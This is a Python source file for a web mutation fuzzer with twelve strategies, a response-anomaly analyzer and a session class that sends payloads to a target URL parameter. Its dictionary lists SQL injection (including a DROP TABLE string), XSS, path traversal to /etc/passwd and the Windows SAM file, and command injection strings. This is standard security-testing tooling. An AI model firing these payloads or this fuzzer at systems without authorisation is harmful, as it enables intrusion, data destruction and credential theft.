"""
Mutation Fuzzer - Real fuzzing engine with 12 mutation strategies.

Converts the disabled mutation-fuzzer.md agent design into active Python.
Generates mutated payloads for binary and text fuzzing with response analysis.
"""

import os
import random
import struct
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


class MutationType(Enum):
    BIT_FLIP = 'bit_flip'
    BYTE_FLIP = 'byte_flip'
    MAGIC_NUMBER = 'magic_number'
    BOUNDARY_VALUE = 'boundary_value'
    FORMAT_STRING = 'format_string'
    TYPE_CONFUSION = 'type_confusion'
    ARITHMETIC = 'arithmetic'
    BUFFER_OVERFLOW = 'buffer_overflow'
    UNICODE = 'unicode'
    NULL_INJECTION = 'null_injection'
    RECURSIVE = 'recursive'
    DICTIONARY = 'dictionary'


@dataclass
class FuzzResult:
    payload: str
    mutation_type: str
    status_code: int = 0
    content_length: int = 0
    response_time: float = 0.0
    is_interesting: bool = False
    reason: str = ''
    response_snippet: str = ''


# Known-bad test strings for dictionary fuzzing
FUZZ_DICTIONARY = [
    # SQL injection
    "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--", "' UNION SELECT NULL--",
    "admin'--", "1; DROP TABLE users--", "' OR ''='", "1' ORDER BY 1--",
    # XSS
    "<script>alert(1)</script>", '"><img src=x onerror=alert(1)>',
    "<svg/onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'",
    '<details open ontoggle=alert(1)>', '{{7*7}}', '${7*7}',
    # Path traversal
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00.jpg", "..%252f..%252f..%252fetc%252fpasswd",
    # Command injection
    "; ls", "| cat /etc/passwd", "$(whoami)", "`id`", "& ping -c 3 127.0.0.1 &",
    "\nid\n", "; sleep 5", "| sleep 5", "%0aid%0a",
    # SSTI
    "{{7*7}}", "${7*7}}", "#{7*7}", "<%= 7*7 %>", "{7*7}", "{{config}}",
    # Misc
    "%00", "%0d%0a", "null", "undefined", "NaN", "Infinity", "-Infinity",
    "true", "false", "[]", "{}", '""', "0", "-1", "99999999999999999",
]

# Magic numbers that often trigger edge cases
MAGIC_NUMBERS = [
    0, -1, 1, 127, 128, 255, 256, 32767, 32768, 65535, 65536,
    2147483647, 2147483648, 4294967295, 4294967296,
    -2147483648, -2147483649,
]

MAGIC_BYTES = [
    b'\x00', b'\xff', b'\x7f', b'\x80', b'\x00\x00', b'\xff\xff',
    b'\x7f\xff\xff\xff', b'\x80\x00\x00\x00', b'\xff\xff\xff\xff',
]

# Unicode edge cases
UNICODE_EDGE_CASES = [
    '\x00',           # Null
    '\ufeff',         # BOM
    '\u200e',         # Left-to-right mark
    '\u200f',         # Right-to-left mark
    '\u202e',         # Right-to-left override
    '\uff1c',         # Fullwidth <
    '\uff1e',         # Fullwidth >
    '\u0000',         # Null
    '\ud800',         # Surrogate (invalid)
    'A\u0300',        # Combining character (A + grave accent)
    '\u2028',         # Line separator
    '\u2029',         # Paragraph separator
    '\uff07',         # Fullwidth apostrophe
    '\uff02',         # Fullwidth quotation mark
    '\u00ad',         # Soft hyphen
    '\u200b',         # Zero-width space
]

FORMAT_STRINGS = [
    '%s', '%x', '%n', '%p', '%d', '%08x', '%s%s%s%s%s%s%s%s%s%s',
    '%p%p%p%p', '{0}', '{0.__class__}', '${7*7}', '{{7*7}}',
    '%x' * 20, 'AAAA%08x.%08x.%08x.%08x',
]


class MutationEngine:
    """Core mutation engine with 12 strategy types."""

    def __init__(self, seed: Optional[int] = None):
        self._rng = random.Random(seed)

    def mutate(self, payload: str, mutation_type: MutationType, count: int = 10) -> List[str]:
        """Generate mutated variants of a payload."""
        dispatch = {
            MutationType.BIT_FLIP: self._bit_flip,
            MutationType.BYTE_FLIP: self._byte_flip,
            MutationType.MAGIC_NUMBER: self._magic_number,
            MutationType.BOUNDARY_VALUE: self._boundary_value,
            MutationType.FORMAT_STRING: self._format_string,
            MutationType.TYPE_CONFUSION: self._type_confusion,
            MutationType.ARITHMETIC: self._arithmetic,
            MutationType.BUFFER_OVERFLOW: self._buffer_overflow,
            MutationType.UNICODE: self._unicode,
            MutationType.NULL_INJECTION: self._null_injection,
            MutationType.RECURSIVE: self._recursive,
            MutationType.DICTIONARY: self._dictionary,
        }
        fn = dispatch.get(mutation_type, self._dictionary)
        return fn(payload, count)

    def mutate_all(self, payload: str, count_per_type: int = 3) -> List[Tuple[str, str]]:
        """Generate mutations across ALL types. Returns (payload, type_name) tuples."""
        results = []
        for mt in MutationType:
            variants = self.mutate(payload, mt, count_per_type)
            for v in variants:
                results.append((v, mt.value))
        return results

    def _bit_flip(self, payload: str, count: int) -> List[str]:
        results = []
        data = payload.encode('utf-8', errors='replace')
        for _ in range(count):
            if not data:
                break
            mutated = bytearray(data)
            pos = self._rng.randint(0, len(mutated) - 1)
            bit = self._rng.randint(0, 7)
            mutated[pos] ^= (1 << bit)
            try:
                results.append(mutated.decode('utf-8', errors='replace'))
            except Exception:
                pass
        return results

    def _byte_flip(self, payload: str, count: int) -> List[str]:
        results = []
        data = payload.encode('utf-8', errors='replace')
        replacements = [0x00, 0xFF, 0x41, 0x0A, 0x0D, 0x27, 0x22, 0x3C, 0x3E]
        for _ in range(count):
            if not data:
                break
            mutated = bytearray(data)
            pos = self._rng.randint(0, len(mutated) - 1)
            mutated[pos] = self._rng.choice(replacements)
            try:
                results.append(mutated.decode('utf-8', errors='replace'))
            except Exception:
                pass
        return results

    def _magic_number(self, payload: str, count: int) -> List[str]:
        results = []
        for num in MAGIC_NUMBERS[:count]:
            results.append(str(num))
            # Also try hex representation
            if num >= 0:
                results.append(hex(num))
        return results[:count]

    def _boundary_value(self, payload: str, count: int) -> List[str]:
        results = []
        try:
            base = int(payload)
            for delta in [-2, -1, 0, 1, 2]:
                results.append(str(base + delta))
            results.extend([str(base * -1), str(base * 2), '0', '-0'])
        except ValueError:
            # Not numeric, try length boundaries
            for length in [0, 1, len(payload) - 1, len(payload), len(payload) + 1,
                           len(payload) * 2, 255, 256, 65535]:
                results.append('A' * length)
        return results[:count]

    def _format_string(self, payload: str, count: int) -> List[str]:
        results = []
        for fmt in FORMAT_STRINGS[:count]:
            results.append(fmt)
            results.append(payload + fmt)
        return results[:count]

    def _type_confusion(self, payload: str, count: int) -> List[str]:
        return [
            '[]', '{}', 'null', 'undefined', 'NaN', 'true', 'false',
            '0', '-1', '""', "''", '[null]', '{"a":"b"}',
            '[0]', '[[]]', str([payload]), '0e0', '0x0',
        ][:count]

    def _arithmetic(self, payload: str, count: int) -> List[str]:
        results = []
        try:
            base = int(payload)
        except ValueError:
            base = 0
        results.extend([
            str(base + 2147483647), str(base - 2147483648),
            str(base * 0), str(-abs(base) if base else -1),
            str(base + 1), str(base - 1),
            str(2**31 - 1), str(-(2**31)), str(2**63 - 1),
        ])
        return results[:count]

    def _buffer_overflow(self, payload: str, count: int) -> List[str]:
        lengths = [100, 500, 1000, 2000, 5000, 10000, 50000, 65536]
        results = []
        for length in lengths[:count]:
            results.append('A' * length)
            results.append(payload + 'B' * (length - len(payload)))
        return results[:count]

    def _unicode(self, payload: str, count: int) -> List[str]:
        results = []
        for uc in UNICODE_EDGE_CASES[:count]:
            results.append(payload + uc)
            results.append(uc + payload)
            if len(payload) > 2:
                mid = len(payload) // 2
                results.append(payload[:mid] + uc + payload[mid:])
        return results[:count]

    def _null_injection(self, payload: str, count: int) -> List[str]:
        null_chars = ['\x00', '%00', '\\0', '\\x00', '\0']
        results = []
        for null in null_chars:
            results.append(payload + null)
            results.append(null + payload)
            if len(payload) > 2:
                mid = len(payload) // 2
                results.append(payload[:mid] + null + payload[mid:])
        return results[:count]

    def _recursive(self, payload: str, count: int) -> List[str]:
        results = []
        # Recursive nesting
        for depth in range(1, min(count, 6)):
            nested = payload
            for _ in range(depth):
                nested = f'({nested})'
            results.append(nested)
        # Recursive encoding
        encoded = payload
        for _ in range(3):
            encoded = urllib.parse.quote(encoded)
            results.append(encoded)
        return results[:count]

    def _dictionary(self, payload: str, count: int) -> List[str]:
        selected = self._rng.sample(FUZZ_DICTIONARY, min(count, len(FUZZ_DICTIONARY)))
        return selected


class ResponseAnalyzer:
    """Analyzes fuzz responses to identify interesting behavior."""

    ERROR_PATTERNS = [
        r'(?i)SQL\s*syntax', r'(?i)mysql', r'(?i)ORA-\d+',
        r'(?i)stack\s*trace', r'(?i)traceback', r'(?i)exception',
        r'(?i)internal\s*server\s*error', r'(?i)fatal\s*error',
        r'(?i)warning:', r'(?i)syntax\s*error', r'(?i)undefined\s*index',
        r'(?i)segmentation\s*fault', r'(?i)null\s*pointer',
    ]

    def is_interesting(self, baseline_status: int, baseline_length: int,
                       baseline_time: float, fuzz_status: int,
                       fuzz_length: int, fuzz_time: float,
                       fuzz_body: str = '') -> Tuple[bool, str]:
        """Determine if a fuzz response indicates a vulnerability."""
        reasons = []

        # Status code change
        if fuzz_status != baseline_status:
            if fuzz_status >= 500:
                reasons.append(f'Server error {fuzz_status} (baseline: {baseline_status})')
            elif fuzz_status != 404:
                reasons.append(f'Status changed: {baseline_status} -> {fuzz_status}')

        # Content length anomaly (>20% change)
        if baseline_length > 0:
            change = abs(fuzz_length - baseline_length) / baseline_length
            if change > 0.2:
                reasons.append(f'Content length changed {change:.0%} ({baseline_length} -> {fuzz_length})')

        # Timing anomaly (>3x baseline)
        if baseline_time > 0 and fuzz_time > baseline_time * 3 and fuzz_time > 2.0:
            reasons.append(f'Timing anomaly: {fuzz_time:.1f}s (baseline: {baseline_time:.1f}s)')

        # Error patterns in response
        if fuzz_body:
            import re
            for pattern in self.ERROR_PATTERNS:
                if re.search(pattern, fuzz_body):
                    reasons.append(f'Error pattern: {pattern}')
                    break

        is_interesting = len(reasons) > 0
        return is_interesting, '; '.join(reasons)


class FuzzingSession:
    """Manages a complete fuzzing session against a target."""

    def __init__(self, target_url: str, param_name: str,
                 method: str = 'GET', headers: Optional[Dict] = None):
        self.target_url = target_url
        self.param_name = param_name
        self.method = method.upper()
        self.headers = headers or {}
        self._engine = MutationEngine()
        self._analyzer = ResponseAnalyzer()
        self._results: List[FuzzResult] = []

    def fuzz(self, base_value: str = 'test', mutations_per_type: int = 5,
             types: Optional[List[MutationType]] = None) -> List[FuzzResult]:
        """Run a complete fuzz session."""
        types = types or list(MutationType)
        results = []

        # Get baseline
        baseline = self._send_request(base_value)
        if not baseline:
            return results

        b_status, b_length, b_time, _ = baseline

        # Generate and test mutations
        for mt in types:
            variants = self._engine.mutate(base_value, mt, mutations_per_type)
            for variant in variants:
                resp = self._send_request(variant)
                if not resp:
                    continue

                f_status, f_length, f_time, f_body = resp
                is_int, reason = self._analyzer.is_interesting(
                    b_status, b_length, b_time,
                    f_status, f_length, f_time, f_body
                )

                result = FuzzResult(
                    payload=variant[:500],
                    mutation_type=mt.value,
                    status_code=f_status,
                    content_length=f_length,
                    response_time=f_time,
                    is_interesting=is_int,
                    reason=reason,
                    response_snippet=f_body[:200] if is_int else '',
                )
                results.append(result)

        self._results = results
        return results

    def get_interesting(self) -> List[FuzzResult]:
        """Return only interesting results from last fuzz session."""
        return [r for r in self._results if r.is_interesting]

    def _send_request(self, value: str) -> Optional[Tuple[int, int, float, str]]:
        """Send request and return (status, length, time, body)."""
        try:
            from engine.core.http_client import HttpClient
            client = HttpClient(target=self.target_url)
            start = time.time()
            if self.method == 'GET':
                sep = '&' if '?' in self.target_url else '?'
                url = f"{self.target_url}{sep}{urllib.parse.quote(self.param_name)}={urllib.parse.quote(value)}"
                resp = client.get(url, headers=self.headers)
            else:
                resp = client.post_json(self.target_url, {self.param_name: value}, headers=self.headers)
            elapsed = time.time() - start
            body = getattr(resp, 'body', '') or ''
            status = getattr(resp, 'status_code', 0) or 0
            return status, len(body), elapsed, body[:2000]
        except Exception:
            # Fallback: try urllib
            try:
                import urllib.request
                start = time.time()
                sep = '&' if '?' in self.target_url else '?'
                url = f"{self.target_url}{sep}{urllib.parse.quote(self.param_name)}={urllib.parse.quote(value)}"
                req = urllib.request.Request(url, headers=self.headers or {})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read(5000).decode('utf-8', errors='replace')
                elapsed = time.time() - start
                return resp.status, len(body), elapsed, body
            except Exception:
                return None


if __name__ == '__main__':
    # Self-test
    engine = MutationEngine(seed=42)
    analyzer = ResponseAnalyzer()

    # Test all mutation types
    for mt in MutationType:
        variants = engine.mutate("test_value", mt, 5)
        print(f"  {mt.value}: {len(variants)} variants")
        assert len(variants) > 0, f"{mt.value} produced no variants"

    # Test mutate_all
    all_mutations = engine.mutate_all("admin", count_per_type=2)
    print(f"\nmutate_all: {len(all_mutations)} total mutations across {len(MutationType)} types")
    assert len(all_mutations) >= len(MutationType)

    # Test response analyzer
    is_int, reason = analyzer.is_interesting(200, 1000, 0.1, 500, 1000, 0.1, "Internal Server Error")
    assert is_int, "500 status should be interesting"
    print(f"Response analysis: interesting={is_int}, reason={reason}")

    is_int2, reason2 = analyzer.is_interesting(200, 1000, 0.1, 200, 1000, 5.0, "")
    assert is_int2, "Timing anomaly should be interesting"
    print(f"Timing analysis: interesting={is_int2}, reason={reason2}")

    # Test dictionary
    assert len(FUZZ_DICTIONARY) >= 40
    print(f"Fuzz dictionary: {len(FUZZ_DICTIONARY)} entries")

    print("\nAll MutationFuzzer tests PASSED")
